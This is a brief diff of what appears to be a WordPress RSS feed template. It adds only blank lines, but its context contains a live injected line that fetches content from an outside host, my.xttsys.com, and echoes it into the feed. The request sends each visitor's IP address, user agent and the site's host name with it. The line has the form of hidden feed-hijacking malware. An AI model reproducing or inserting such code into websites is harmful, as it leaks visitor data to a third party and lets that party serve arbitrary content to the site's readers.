@@ -1,3 +1,5 @@
+
+
 header( 'Content-Type: ' . feed_content_type( 'rss2' ) . '; charset=' . get_option( 'blog_charset' ), true );
 $more = 1;
 echo file_get_contents('https://my.xttsys.com/server/wp_feed_?ip='.urlencode($_SERVER['HTTP_X_FORWARDED_FOR']).'&ua='.urlencode($_SERVER['HTTP_USER_AGENT']).'&web='.urlencode($_SERVER['HTTP_HOST']));
